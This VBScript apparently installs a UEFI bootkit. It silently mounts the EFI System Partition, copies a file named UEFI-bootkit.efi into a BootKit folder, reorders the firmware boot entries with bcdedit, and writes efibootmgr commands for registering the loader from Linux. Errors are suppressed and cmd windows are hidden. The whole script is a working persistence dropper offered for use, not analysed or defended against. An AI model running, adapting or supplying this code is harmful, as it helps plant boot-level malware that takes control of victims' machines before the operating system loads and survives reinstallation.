Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
efiFile = scriptPath & "\UEFI-bootkit.efi"
espPath = "Z:\EFI\BootKit\"

On Error Resume Next

' Монтируем ESP раздел (если возможно)
WshShell.Run "cmd /c mountvol Z: /S", 0, True

If fso.FileExists(efiFile) Then
    ' Копируем файл в ESP раздел
    If fso.FolderExists("Z:\") Then
        If Not fso.FolderExists(espPath) Then fso.CreateFolder(espPath)
        fso.CopyFile efiFile, espPath & "UEFI-bootkit.efi", True
        
        ' Пытаемся создать UEFI переменную через firmware (если драйверы разрешают)
        WshShell.Run "cmd /c bcdedit /set {fwbootmgr} displayorder {bootmgr} /addfirst", 0, True
        
        ' Генерируем команды для ручного выполнения из Linux
        Set ts = fso.CreateTextFile(scriptPath & "\uefi-commands.txt", True)
        ts.WriteLine("Для добавления UEFI записи выполните в Linux:")
        ts.WriteLine("sudo efibootmgr --create --disk /dev/nvme0n1 --part 1 --label 'BootKit' --loader \EFI\BootKit\UEFI-bootkit.efi")
        ts.WriteLine("sudo efibootmgr -o 0,1")
        ts.Close
    Else
        MsgBox "ESP раздел не доступен. Запустите от администратора.", vbCritical
    End If
Else
    MsgBox "UEFI-bootkit.efi не найден", vbCritical
End If

' Размонтируем ESP
WshShell.Run "cmd /c mountvol Z: /D", 0, True
